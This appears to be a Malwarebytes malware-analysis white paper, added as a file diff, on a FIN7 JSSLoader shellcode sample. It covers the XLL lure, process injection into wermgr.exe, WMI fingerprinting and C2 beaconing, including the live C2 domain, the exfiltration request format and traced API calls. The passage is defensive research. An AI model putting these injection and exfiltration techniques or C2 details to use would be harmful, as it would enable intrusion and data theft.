@@ -1,0 +1,1928 @@
+﻿1 | P a g e  
+ 
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+2 | P a g e  
+ 
+This white paper was authored by Hasherezade and the Malwarebytes Threat Intelligence team 
+
+The Malwarebytes Threat Intelligence team observed a malspam campaign in late June that we attribute to 
+the FIN7 APT group. One of the samples was also reported on Twitter by Josh Trombley; during execution, it 
+was observed to drop a secondary payload, written in .NET. 
+
+Details about FIN7 campaigns were described i.e. by Mandiant in the article "FIN7 Power Hour: Adversary 
+Archeology and the Evolution of FIN7". Earlier this year Morphisec and Secureworks described a new 
+component used by this group, delivered in XLL format. That element was the first step in the attack chain 
+leading to another malware, dubbed JSSLoader.  
+
+During our analysis, we found out that the current malware used by FIN7 is yet another rewrite of JSSLoader 
+with expanded capabilities as well as new functions that include data exfiltration. In this white paper, we will 
+focus on the implementation details of the new observed sample, and provide a deep dive in the code, as well 
+as compare it with earlier samples analyzed by other vendors. 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+3 | P a g e  
+ 
+
+Contents 
+Overview ............................................................................................................................................................................. 4 
+
+Behavioral analysis .............................................................................................................................................................. 5 
+
+The JSON report .............................................................................................................................................................. 8 
+
+Internals ............................................................................................................................................................................ 11 
+
+The final stage ................................................................................................................................................................... 20 
+
+Getting our hands on the final shellcode .................................................................................................................... 20 
+
+Tracing the dumped shellcode ..................................................................................................................................... 21 
+
+Implementation details ................................................................................................................................................ 23 
+
+String obfuscation & deobfuscation ............................................................................................................................ 24 
+
+The main function ........................................................................................................................................................ 24 
+
+Supported commands .................................................................................................................................................. 27 
+
+The secondary payload: .NET ............................................................................................................................................ 51 
+
+Comparison with older samples ....................................................................................................................................... 57 
+
+The XLL sample (March) ............................................................................................................................................... 57 
+
+The C++ version of JSSLoader ....................................................................................................................................... 58 
+
+Conclusion ......................................................................................................................................................................... 64 
+
+IOCs ................................................................................................................................................................................... 65 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+4 | P a g e  
+ 
+
+Overview 
+
+The main focus of the analysis are the following samples: 
+
+ The first stage: XLL file carrying JSSLoader (shellcode edition) 
+ The second stage: .NET version of JSSLoader   
+
+For the comparison, we use: 
+
+ The C++ version of JSSLoader reported by Proofpoint in June 2021 
+ The XLL sample reported by Morphisec  in March 2022 
+
+The execution flow of the analyzed sample can be summarized by the following diagram: 
+
+ 
+
+Figure 1 - The execution flow reconstructed after the complete analysis 
+
+ 
+
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+5 | P a g e  
+ 
+
+Behavioral analysis 
+
+The initial sample is an XLL file, which is an add-on for MS Excel. XLL is a PE file, and in order to be run 
+automatically, requires MS Excel to be installed on the victim's machine. Double-clicking the file triggers MS 
+Excel and runs the API function xlAutoOpen, exported by the add-on. Since the sample is not signed, the user 
+will be prompted with a popup warning about it. 
+
+ 
+
+Figure 2 
+
+Although the component itself is not an Excel Sheet, it tries to disguise as one, by dropping a decoy and 
+displaying it once it was run: 
+
+ 
+
+Figure 3 
+
+This cover makes sense as the Invoice theme was used as a lure. At the same time, the malicious shellcode 
+runs in the background, making an injection into wermgr.exe. 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+6 | P a g e  
+ 
+
+ 
+
+Figure 4 – excel spawning wermgr.exe 
+
+At this point, we can dump all the injected material by scanning the wermgr.exe process with PE-
+sieve/HollowsHunter: 
+
+ 
+
+Figure 5 - Material dumped from wermgr.exe with the help of PE-sieve: the final stage shellcode 
+
+The implant establishes a connection with a C2 (Command & Control) server. It tries to connect to the 
+domain essentialsmassageanddayspa[.]com over port 443. At the time of the analysis, the domain was 
+inactive. 
+
+ 
+
+Figure 6 - Implant trying to connect to C2 observed by Fiddler 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+7 | P a g e  
+ 
+It is worth to note that the currently analyzed add-on is 32 bit, hence it runs only with a 32-bit version of 
+Office. However, the carried final payload is 64 bit, so the full chain of infection can be deployed only on a 64-
+bit version of Windows. 
+
+If we try to deploy the add-on via 64-bit Office, it won't run properly. Instead, we get the content of the 
+executable displayed as the Excel sheet: 
+
+ 
+
+Figure 7 – Alert about the format issue 
+
+ 
+
+ 
+
+Figure 8 - Invalid open: in the Excel 64 bit, the 32 bit add-on is displayed, instead of executed 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+8 | P a g e  
+ 
+The JSON report 
+ 
+
+During behavioral analysis in the sandbox, we observed the following traffic sent to the C2 from the 
+infected wermgr.exe process: 
+
+ 
+
+Figure 9 - Network traffic dump, observed by AnyRun 
+
+The first two chunks are 0-DWORDs (they denote a Base64 buffer filled with `00 00 00 00`). After decoding the 
+third Base64 chunk, we get the following JSON report: 
+
+{"host":"N","domain":"WORKGROUP","user":"admin","sysinfo":{"OperatingSystem***":"","BootDevice":"\
+\Device\\HarddiskVolume1","BuildNumber":"16299","BuildType":"Multiprocessor 
+Free","Caption":"Microsoft Windows 10 
+Pro","CodeSet":"1252","CountryCode":"1","CreationClassName":"Win32_OperatingSystem","CSCreationCla
+ssName":"Win32_ComputerSystem","CSName":"DESKTOP-
+JGLLJLD","FreePhysicalMemory":"5002500","FreeSpaceInPagingFiles":"1048576","FreeVirtualMemory":"61
+44640","InstallDate":"20180410115112.000000+000","LastBootUpTime":"20220729122623.287675+000","Loc
+alDateTime":"20220729124648.309000+000","Locale":"0409","Manufacturer":"Microsoft 
+Corporation","MaxProcessMemorySize":"137438953344","Name":"Microsoft Windows 10 
+Pro|C:\\WINDOWS|\\Device\\Harddisk0\\Partition2","OSArchitecture":"64-
+bit","RegisteredUser":"Windows User","SerialNumber":"00330-80002-46879-
+AA844","SizeStoredInPagingFiles":"1048576","Status":"OK","SystemDevice":"\\Device\\HarddiskVolume2
+","SystemDirectory":"C:\\WINDOWS\\system32","SystemDrive":"C:","TotalVirtualMemorySize":"7334348",
+"TotalVisibleMemorySize":"6285772","Version":"10.0.16299","WindowsDirectory":"C:\\WINDOWS","Proces
+sor***":"","Caption":"AMD64 Family 6 Model 14 Stepping 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+9 | P a g e  
+ 
+3","CreationClassName":"Win32_Processor","Description":"AMD64 Family 6 Model 14 Stepping 
+3","DeviceID":"CPU0","Manufacturer":"AuthenticAMD","Name":"Intel(R) Core(TM) i5-6400 CPU @ 
+2.70GHz","ProcessorId":"078BFBFF000506E3","Role":"CPU","SocketDesignation":"CPU 
+0","Status":"OK","Stepping":"3","SystemCreationClassName":"Win32_ComputerSystem","SystemName":"DES
+KTOP-JGLLJLD","Version":"Model 14, Stepping 3","ComputerSystem,ram***":"","BootupState":"Normal 
+boot","Caption":"DESKTOP-JGLLJLD","CreationClassName":"Win32_ComputerSystem","Description":"AT/AT 
+COMPATIBLE","DNSHostName":"DESKTOP-
+JGLLJLD","Domain":"WORKGROUP","Manufacturer":"DELL","Model":"DELL","Name":"DESKTOP-
+JGLLJLD","PauseAfterReset":"-1","PrimaryOwnerName":"Windows 
+User","Status":"OK","SystemFamily":"DELL","SystemSKUNumber":"J5CR","SystemType":"x64-based 
+PC","TotalPhysicalMemory":"6436630528","UserName":"DESKTOP-
+JGLLJLD\\admin","Workgroup":"WORKGROUP","NetFrameworks":"CDF|v4.0|C:/Windows/Microsoft.NET/Framewo
+rk64/v4.0.30319/||v2.0.50727|1033|2.0.50727.4927||v3.0|Setup|1033|3.0.30729.4926|Windows 
+Communication Foundation|3.0.4506.4926|Windows Presentation 
+Foundation|3.0.6920.4902||v3.5|1033|3.5.30729.4926||v4|Client|1033|4.7.02556|Full|1033|4.7.02556||
+v4.0|Client|4.0.0.0||","OfficeVer":"Outlook;16.0;Wow64","LoaderBits":"64"},"processes":[{"name":"[
+System Process]","pid":"0"} ,{"name":"System","pid":"4"} ,{"name":"smss.exe","pid":"340"} 
+,{"name":"csrss.exe","pid":"660"} ,{"name":"wininit.exe","pid":"820"} 
+,{"name":"csrss.exe","pid":"852"} ,{"name":"winlogon.exe","pid":"352"} 
+,{"name":"services.exe","pid":"532"} ,{"name":"lsass.exe","pid":"556"} 
+,{"name":"fontdrvhost.exe","pid":"528"} ,{"name":"fontdrvhost.exe","pid":"540"} 
+,{"name":"svchost.exe","pid":"1004"} ,{"name":"svchost.exe","pid":"468"} 
+,{"name":"svchost.exe","pid":"364"} ,{"name":"svchost.exe","pid":"844"} 
+,{"name":"dwm.exe","pid":"988"} ,{"name":"svchost.exe","pid":"332"} 
+,{"name":"svchost.exe","pid":"1028"} ,{"name":"svchost.exe","pid":"1148"} 
+,{"name":"svchost.exe","pid":"1156"} ,{"name":"svchost.exe","pid":"1380"} 
+,{"name":"svchost.exe","pid":"1420"} ,{"name":"svchost.exe","pid":"1908"} 
+,{"name":"svchost.exe","pid":"1944"} ,{"name":"svchost.exe","pid":"1212"} 
+,{"name":"svchost.exe","pid":"1548"} ,{"name":"svchost.exe","pid":"1880"} 
+,{"name":"svchost.exe","pid":"1924"} ,{"name":"svchost.exe","pid":"1796"} 
+,{"name":"svchost.exe","pid":"1828"} ,{"name":"svchost.exe","pid":"1232"} 
+,{"name":"svchost.exe","pid":"1952"} ,{"name":"svchost.exe","pid":"1164"} 
+,{"name":"svchost.exe","pid":"1608"} ,{"name":"svchost.exe","pid":"1720"} 
+,{"name":"svchost.exe","pid":"2016"} ,{"name":"svchost.exe","pid":"1144"} 
+,{"name":"svchost.exe","pid":"1564"} ,{"name":"svchost.exe","pid":"2260"} 
+,{"name":"svchost.exe","pid":"2492"} ,{"name":"svchost.exe","pid":"2500"} 
+,{"name":"svchost.exe","pid":"2828"} ,{"name":"spoolsv.exe","pid":"2880"} 
+,{"name":"svchost.exe","pid":"2328"} ,{"name":"svchost.exe","pid":"2464"} 
+,{"name":"svchost.exe","pid":"2136"} ,{"name":"OfficeClickToRun.exe","pid":"2364"} 
+,{"name":"svchost.exe","pid":"2412"} ,{"name":"svchost.exe","pid":"2512"} 
+,{"name":"armsvc.exe","pid":"2772"} ,{"name":"svchost.exe","pid":"2760"} 
+,{"name":"svchost.exe","pid":"2812"} ,{"name":"svchost.exe","pid":"2960"} 
+,{"name":"svchost.exe","pid":"2580"} ,{"name":"SecurityHealthService.exe","pid":"2352"} 
+,{"name":"svchost.exe","pid":"2712"} ,{"name":"svchost.exe","pid":"3164"} 
+,{"name":"svchost.exe","pid":"3300"} ,{"name":"svchost.exe","pid":"3112"} 
+,{"name":"sihost.exe","pid":"2096"} ,{"name":"svchost.exe","pid":"3288"} 
+,{"name":"svchost.exe","pid":"3968"} ,{"name":"svchost.exe","pid":"628"} 
+,{"name":"svchost.exe","pid":"3428"} ,{"name":"explorer.exe","pid":"3856"} 
+,{"name":"ShellExperienceHost.exe","pid":"5116"} ,{"name":"SearchUI.exe","pid":"4552"} 
+,{"name":"RuntimeBroker.exe","pid":"5016"} ,{"name":"RuntimeBroker.exe","pid":"4236"} 
+,{"name":"svchost.exe","pid":"4676"} ,{"name":"ctfmon.exe","pid":"4780"} 
+,{"name":"dllhost.exe","pid":"4592"} ,{"name":"dllhost.exe","pid":"3756"} 
+,{"name":"svchost.exe","pid":"3020"} ,{"name":"svchost.exe","pid":"6104"} 
+,{"name":"svchost.exe","pid":"4600"} ,{"name":"SearchIndexer.exe","pid":"2160"} 
+,{"name":"svchost.exe","pid":"5372"} ,{"name":"SearchProtocolHost.exe","pid":"3688"} 
+,{"name":"svchost.exe","pid":"3924"} ,{"name":"msiexec.exe","pid":"4180"} 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+10 | P a g e  
+ 
+,{"name":"svchost.exe","pid":"5848"} ,{"name":"svchost.exe","pid":"5788"} 
+,{"name":"svchost.exe","pid":"5928"} ,{"name":"svchost.exe","pid":"384"} 
+,{"name":"dllhost.exe","pid":"2120"} ,{"name":"RuntimeBroker.exe","pid":"2640"} 
+,{"name":"SearchFilterHost.exe","pid":"1748"} ,{"name":"ConsoleApplication3.exe","pid":"6092"} 
+,{"name":"conhost.exe","pid":"5680"} ,{"name":"EXCEL.EXE","pid":"6012"} 
+,{"name":"wermgr.exe","pid":"4972"} ,{"name":"WmiPrvSE.exe","pid":"312"} 
+,{"name":"sppsvc.exe","pid":"5080"} ,{"name":"svchost.exe","pid":"1968"} 
+,{"name":"ConsoleApplication3.exe","pid":"1312"} ,{"name":"WerFault.exe","pid":"1572"} 
+,{"name":"svchost.exe","pid":"2008"}],"desktop_file_list":[{"file":"accountgear.rtf", 
+"size":"2992"},{"file":"capitalca.png", "size":"7676"},{"file":"desktop.ini", 
+"size":"282"},{"file":"documentationinside.rtf", "size":"2987"},{"file":"firstlower.rtf", 
+"size":"2801"},{"file":"golfenjoy.png", "size":"4893"},{"file":"impactuniversity.rtf", 
+"size":"2819"},{"file":"itsshot.rtf", "size":"2721"},{"file":"novemberup.rtf", 
+"size":"2795"},{"file":"searchesohio.jpg", "size":"17817"},{"file":"websize.rtf", 
+"size":"2885"}],"adinfo":{"part_of_domain":"no"}} 
+ 
+
+We can see that this data is in the same format as described in Mandiant's post - at `Figure 21: Data Collection 
+JSON Format Snippet of FLOWLGAZE("JssLoader")`. Quoted fragment: 
+
+{"host":"", "domain": "", "user":"", "processes": [] ,"desktop_file_list": [] ,"adinfo": 
+{"adinformation":"no_ad", "part_of_domain":"no", "pc_domain":"", "pc_dns_host_name":"", 
+"pc_model":""}} 
+ 
+
+Format observed in the currently analyzed sample is very similar, but contains some subtle changes, such as 
+added category "sysinfo": 
+
+{"host":"", "domain": "", "user":"", "sysinfo": {} , "processes": [] ,"desktop_file_list": [] 
+,"adinfo": {"part_of_domain": "no"}} 
+ 
+
+The used format points to JssLoader. As Mandiant noted, the implants using this collective name may have 
+different implementations. They distinguished BIRDWATCH and CROWVIEW, both written in .NET, but 
+containing differences in some of the available functionality. They also mentioned that: "BIRDWATCH and 
+CROWVIEW have separate versions implemented in C++.". As Proofpoint reported (here), the C++ version was 
+first observed in June 2021, and describes as a rewrite of the .NET component that was used before for 
+analogous purposes. 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+11 | P a g e  
+ 
+
+Internals 
+
+Technically, the XLL is a DLL following the Excel's API. 
+
+ 
+
+Figure 10 – Exports table of the XLL file (view from PE-bear) 
+
+We will start our analysis from looking into the function xlAutoOpen, since it is triggered on the opening of the 
+Excel sheet. As we found out, it is responsible for loading the next stage shellcode. 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+12 | P a g e  
+ 
+
+ 
+
+Figure 11 - Decompiled code of the xlAutoOpen function 
+
+The shellcode loading function: 
+
+ 
+
+Figure 12 – The sample allocated the virtual memory, copies there the hardcoded buffer, and redirects execution 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+13 | P a g e  
+ 
+ 
+
+Before the shellcode is loaded, it drops a decoy – an XLS file that is embedded in the executable. 
+
+ 
+
+Figure 13 
+
+After the decoy is displayed, the embedded shellcode is copied into a newly allocated memory and executed. 
+We can trace the execution of this shellcode with the help of tiny_tracer. 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+14 | P a g e  
+ 
+
+ 
+
+Figure 14 - The fragment of IDA view with the tracelog applied, showing the fragment of the code responsible for redirecting execution to the 
+shellcode. 
+
+The fragment of the log containing the calls made from within the loaded shellcode, is given below: 
+
+https://gist.github.com/hasherezade/48b667c80d8837afd91d646a997c3455 
+
+The shellcode that is loaded creates wermgr.exe in a suspended state, and it prepares the next stage to be 
+injected there: 
+
+> 279a0000+38f;kernel32.GetNativeSystemInfo 
+> 279a0000+16d;kernel32.VirtualAlloc 
+> 279a0000+5e2;ntdll.RtlWow64EnableFsRedirectionEx 
+> 279a0000+41b;kernel32.GetSystemDirectoryW 
+> 279a0000+545;kernel32.CreateProcessInternalW 
+ Arg[0] = 0 
+ Arg[1] = 0 
+ Arg[2] = ptr 0x00b3f130 -> L"C:\Windows\system32\wermgr.exe" 
+ Arg[3] = 0 
+ Arg[4] = 0 
+ Arg[5] = 0 
+ Arg[6] = 0x0800000c = 134217740 
+ 
+
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+15 | P a g e  
+ 
+ Arg[7] = 0 
+ Arg[8] = ptr 0x00b3ef20 -> L"C:\Windows\system32" 
+ 
+> 279a0000+5e2;ntdll.RtlWow64EnableFsRedirectionEx 
+> 279a0000+16d;kernel32.VirtualAlloc 
+> 279a0000+16d;kernel32.VirtualAlloc 
+> 279a0000+16d;kernel32.VirtualAlloc 
+> 279a0000+648;called: ?? [279a1000+67d] 
+> 279a0000+2f4;called: ?? [279a1000+680] 
+> 279a0000+33e;called: ?? [28290000+0] 
+ 
+
+Since the initial sample is 32-bit, and the injection is to be made into a 64-bit wermgr.exe process, the loader 
+needs to first switch into 64-bit mode, using the Heaven's Gate technique. It is done by a small stub, which is 
+in another piece of shellcode. Worth to note, that this is the point of the execution where the Pin tracer loses 
+the track (Intel Pin doesn't support the transition from between 32/64 bit modes). 
+
+First, the stub is being called: 
+
+ 
+
+Figure 15 - The call is being made to another, smaller fragment of shellcode (view from x64dbg) 
+
+ 
+
+ 
+
+ 
+
+ 
+ 
+
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+16 | P a g e  
+ 
+ 
+
+The stub is very short and simple: 
+
+ 
+
+Figure 16 - The stub containing the Heaven's Gate 
+
+First, the shellcode switches execution into 64-bit mode, with the help of the far call with the segment selector 
+0x33 (typical for 64-bit mode). Then, in 64-bit mode, it calls the 64-bit piece of the shellcode, that has been 
+loaded (at the particular run) at 0x3A00000. 
+
+This next piece of shellcode is 64 bit. It is responsible for doing the injection into wermgr.exe. The code that is 
+written into wermgr.exe will be the final stage. The execution of the shellcode starts with an initial jump, that 
+leads to the following function, denoted as shc_main: 
+
+ 
+
+Figure 17 - The start function of the 64 bit shellcode: loader of the final stage 
+
+ 
+
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+17 | P a g e  
+ 
+The shellcode loads the following functions from the native API: 
+
+ ntdll.NtWriteVirtualMemory 
+ ntdll.NtQueryInformationProcess 
+ ntdll.NtAllocateVirtualMemory 
+ ntdll.NtProtectVirtualMemory 
+ ntdll.NtDelayExecution 
+ ntdll.NtResumeThread 
+ ntdll.NtReadVirtualMemory 
+
+After loading the imports and preparing the stage, the injection part starts. The high level overview of the 
+function is illustrated by the Figure 18. 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+18 | P a g e  
+ 
+
+ 
+
+Figure 18 - The main function of the shellcode performing the final stage injection 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+19 | P a g e  
+ 
+This piece of shellcode operates on the handle to wermgr.exe, which was previously created in a suspended 
+mode (both process handle, and the thread handle, are stored in the custom structure, and the current piece 
+of shellcode reads them from there). 
+
+We can see it writing the next, bigger piece of shellcode into the process. The address of the memory 
+allocated for the next shellcode is used to prepare the stub, that will be written at the Entry Point of 
+wermgr.exe: 
+
+ 
+
+Figure 19 - Preparing the stub that will be written at wermgr.exe Entry Point 
+
+After all data is written, finally the main thread of wermgr.exe is resumed, so that the execution of the implant 
+can start. 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+20 | P a g e  
+ 
+
+The final stage 
+
+Getting our hands on the final shellcode 
+ 
+
+The wermgr.exe process that was earlier created in a suspended state has the next stage shellcode implanted. 
+Also, its Entry Point is patched so that when the main thread resumes, the execution is redirected to the 
+implant. 
+
+ 
+
+Figure 20 - The patched Entry Point of wermgr.exe: the address of the next stage shellcode is stored in RAX register, which is further called by PUSH-
+TO-RET technique. 
+
+The next part of the shellcode is in a new memory page, pointed by the patched Entry Point. 
+
+ 
+
+Figure 21 - Start of the next stage injected into wermgr.exe 
+
+ 
+
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+21 | P a g e  
+ 
+The shellcode's execution starts by dynamically filling its custom import table. 
+
+We can dump the injected shellcode from memory, along with the loaded imports, with the help of PE-
+sieve/HollowsHunter (as at Figure 5).  By looking at the dumped list of imports, we can be sure that this 
+component is going to connect to the C2, so this is probably the component responsible for generating the 
+observed traffic. 
+
+To make the static analysis of the shellcode easier, we can further load the dumped imports into the IDA 
+database, as demonstrated here. 
+
+Tracing the dumped shellcode 
+ 
+
+To make the dynamic analysis easier, we dumped the shellcode from wermgr.exe once again, before the 
+execution, and wrapped in a loader, to run as a standalone executable. (Note that dumping the shellcode after 
+it already executed can make it unfit for dynamic analysis: often some important data inside, such as 
+checksums necessary for imports loading, is overwritten on first run). 
+
+Such executable was further traced with the help of tiny_tracer, giving the following tracelog: 
+
+ https://gist.github.com/hasherezade/61f776b07e575b9fe664e9775cdb691e 
+
+By reading the tracelog we can find out that this was the component responsible for generating the JSON 
+report observed during the behavioral analysis. We can see for example, how the WMI interface was used to 
+query details about the system, that were later appended to the report. 
+
+4eec0;combase.CoInitializeEx 
+4eef5;combase.CoInitializeSecurity 
+4ef47;combase.CoCreateInstance 
+4ef9e;wbemprox.[unnamedImageEntryPoint+10b0]* 
+4efd3;combase.CoSetProxyBlanket 
+55068;oleaut32.SysAllocString 
+5507d;oleaut32.SysAllocString 
+5509e;fastprox.[??1CWbemGuidToClassMap@@QEAA@XZ+210]* 
+550b6;oleaut32.SysFreeString 
+ Arg[0] = ptr 0x000000423c4f1c78 -> L"SELECT * FROM Win32_OperatingSystem" 
+ 
+550bc;oleaut32.SysFreeString 
+ Arg[0] = ptr 0x000000423c4e9648 -> L"WQL" 
+ 
+
+Extensive use of WMI for enumeration and system fingerprinting, is typical for this group of FIN7 malware, and 
+was also mentioned in the previously quoted Mandiant report. 
+
+The current sample executes the following queries: 
+
+ "SELECT * FROM Win32_OperatingSystem" 
+ "SELECT * FROM Win32_Processor" 
+ "SELECT * FROM Win32_ComputerSystem" 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+22 | P a g e  
+ 
+We can also see how the information about processes are being printed to the expected format (compare to 
+the fragments of JSON report from the behavioral analysis, i.e. {"name":"svchost.exe","pid":"384"}): 
+
+4e704;ntdll.RtlAllocateHeap 
+5410e;kernel32.Process32NextW 
+5411b;kernel32.CloseHandle 
+4f0a7;kernel32.HeapFree 
+50b78;user32.wsprintfW 
+ Arg[0] = ptr 0x000000423c42dd00 -> L"","pid":"" 
+ Arg[1] = ptr 0x000000423c42e310 -> L"%u" 
+ Arg[2] = 0 
+ 
+
+Further on, the shellcode initiated the connection with the C2 server, as the User Agent "curl/7.78.0". This 
+User Agent which was also mentioned in the report on JSSLoader by Morphisec (at: Figure 4: User Agent 
+changes between samples). 
+
+4d501;wininet.InternetOpenW 
+ Arg[0] = ptr 0x000000423c42e130 -> L"curl/7.78.0" 
+ Arg[1] = 0 
+ Arg[2] = 0 
+ Arg[3] = 0 
+ Arg[4] = 0x0000004200000000 = 283467841536 
+ 
+5087b;wininet.InternetConnectW 
+ Arg[0] = 0x0000000000cc0004 = 13369348 
+ Arg[1] = ptr 0x000000423c42e580 -> L"essentialsmassageanddayspa.com" 
+ Arg[2] = 0x00000000000001bb = 443 
+ Arg[3] = 0 
+ Arg[4] = 0 
+ Arg[5] = 0x00007ff600000003 = 140694538682371 
+ Arg[6] = 0 
+ 
+54553;wininet.HttpOpenRequestW 
+ Arg[0] = 0x0000000000cc0008 = 13369352 
+ Arg[1] = ptr 0x000000423c42e580 -> L"POST" 
+ Arg[2] = ptr 0x000000423c4be050 -> L"/?id=testmachineTESTMACHINE&type=a" 
+ Arg[3] = 0 
+ Arg[4] = 0 
+ 
+5458a;wininet.InternetQueryOptionW 
+545a5;wininet.InternetSetOptionW 
+545ea;wininet.HttpSendRequestW 
+ Arg[0] = 0x0000000000cc000c = 13369356 
+ Arg[1] = 0 
+ Arg[2] = 0 
+ Arg[3] = ptr 0x000000423c4fbe70 -> {AAAAAA==} 
+ Arg[4] = 0x0000000000001af2 = 6898 
+ 
+
+This points to the conclusion that the shellcode itself, and not any secondary payload, was responsible for the 
+generated traffic, typical of JSSLoader. 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+23 | P a g e  
+ 
+While in the case of the sample described by Morphisec the XLL file was just used as a downloader for the next 
+stage, here we can find the whole JSSLoader embedded in the binary, in shellcode form. Yet, it may still 
+download additional samples after connecting to its C2. 
+
+Implementation details 
+ 
+
+Now let's dive into details of the implementation. The execution starts from a single jump, that leads into a 
+small stub. This stub is responsible for preparing the stage: loading imports into a custom IAT, and then 
+jumping to the shellcode's main function: 
+
+ 
+
+Figure 22 - The start function of the final shellcode 
+
+Exactly the same import loading could be found in the previous shellcode chunks, which means the 
+consecutive components were built following the same template, most likely by the same authors. 
+
+The malware makes a use of a custom buffer structure for keeping and aggregating data. The same structure is 
+used in multiple places within the module. Reconstruction given below: 
+
+struct t_buffer 
+{ 
+  _DWORD unit_size; 
+  _DWORD buffer_allocated_size; 
+  _DWORD buffer_units_count; 
+  _BYTE *buffer; 
+}; 
+ 
+
+This buffer allows to store a continuous chunk of bytes, as well as a list of elements, where the maximal size of 
+an element is defined. 
+
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+24 | P a g e  
+ 
+String obfuscation & deobfuscation 
+ 
+
+All the strings within the module are obfuscated, and they are fetched by their hardcoded IDs. Sometimes 
+after decoding, additional conversion to Unicode is applied, for example: 
+
+ 
+
+Figure 23 
+
+Decoding of the strings is crucial for getting deeper understanding of the malware functionality. The following 
+tool was used for strings deobfuscation:  
+
+ https://gist.github.com/hasherezade/6eb355c2c81e640e7470fafe4db3f069 (it loads the original 
+shellcode, and then deploys a decoding function out of it) 
+
+The generated listing: 
+
+ https://gist.github.com/hasherezade/4048e435cda43be374277afb06744ab1 
+
+The main function 
+ 
+
+The main function starts by creating a token, that will be used in the POST request sent to the C2. The token 
+corresponds to what we observed during tracing and the behavioral analysis 
+(example:  L"/?id=testmachineTESTMACHINE&type=a"). It is in the following 
+format: "/?id=[domain][computername]&type=a". 
+
+The communication with the C2 starts with the malware sending report about the infected system. After 
+successful beaconing, the C2 communication loop starts. This is the function where the module awaits the 
+commands from the C2, and executes them. 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+25 | P a g e  
+ 
+
+ 
+
+Figure 24 - The main function of the final stage, with deobfuscated strings added as comments 
+
+The function denoted as `c2_send_system_fingerprint` is responsible for collecting extensive 
+information about the system, and aggregating them in the JSON report, that is further sent to the C2. 
+Fragment of the function responsible for gathering the information to the JSON report presented at Figure 25. 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+26 | P a g e  
+ 
+
+ 
+
+Figure 25 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+27 | P a g e  
+ 
+Supported commands 
+ 
+
+As observed before, the malware can work as a downloader of further payloads. However, its functionality is 
+very rich and allows not only for dropping and executing PE-based payloads, but also for deploying scripts and 
+shellcodes. Among the available payload formats is JavaScript - hence the name JSSLoader. 
+
+The function responsible for deploying commands is illustrated by the Figure 26. 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+28 | P a g e  
+ 
+
+ 
+
+Figure 26 - The function parsing the commands: IDA view after the analysis. The commands from the previous version have been annotated. 
+ 
+
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+29 | P a g e  
+ 
+Logged information about the outputs of the executed commands are being added into the global logger. 
+Further on, this buffer is fetched, Base64 encoded, and sent to the C2. 
+
+ 
+
+Figure 27 - Fragment of the code responsible for Base64 encoding, and sending of the output to the C2 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+30 | P a g e  
+ 
+Generating of random names 
+Files are being dropped under random names, based on the hardcoded dictionary: 
+
+ 
+
+Figure 28 - The function generating a random name out of the dictionary 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+ 
+
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+31 | P a g e  
+ 
+The dictionary contains 49 values, with indexes starting from 1: 
+
+1,"rain" 
+2,"faint" 
+3,"shark" 
+4,"hierarchy" 
+5,"brush" 
+6,"grimace" 
+7,"recognize" 
+8,"mountain" 
+9,"place" 
+10,"pressure" 
+11,"delay" 
+12,"volunteer" 
+13,"snarl" 
+14,"shame" 
+15,"attitude" 
+16,"pool" 
+17,"priority" 
+18,"snack" 
+19,"category" 
+20,"my" 
+21,"necklace" 
+22,"decorative" 
+23,"tower" 
+24,"fountain" 
+25,"software" 
+26,"siege" 
+27,"trade" 
+28,"gravel" 
+29,"beginning" 
+30,"fragrant" 
+31,"execute" 
+32,"orthodox" 
+33,"harmful" 
+34,"classroom" 
+35,"ostracize" 
+36,"blade" 
+37,"hypnothize" 
+38,"general" 
+39,"achieve" 
+40,"poetry" 
+41,"ensure" 
+42,"prison" 
+43,"find" 
+44,"prevent" 
+45,"extract" 
+46,"presidential" 
